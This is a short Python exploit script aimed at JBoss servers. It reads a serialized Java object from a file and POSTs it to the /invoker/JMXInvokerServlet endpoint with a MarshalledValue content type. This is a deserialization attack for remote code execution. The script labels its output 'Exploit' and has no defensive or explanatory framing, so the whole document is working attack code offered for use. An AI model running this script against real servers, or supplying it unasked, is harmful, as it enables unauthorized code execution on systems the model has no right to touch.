#!/usr/bin/env python
# coding: utf-8

import sys
import requests


if len(sys.argv) < 2:
    print('Usage: python %s <jboss_host> </path/to/payload>' % sys.argv[0])
    sys.exit()

jboss_host = sys.argv[1]
pd_path = sys.argv[2]

i_headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36',
    'Content-Type': 'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue'
}
print('Exploit ====> Read payload from file "%s"' % pd_path)
payload = open(pd_path, 'rb').read()
print('Exploit ====> Sending payload to "%s"...' % (jboss_host + '/invoker/JMXInvokerServlet'))
response = requests.post(jboss_host + '/invoker/JMXInvokerServlet', headers=i_headers, data=payload)
print response.content
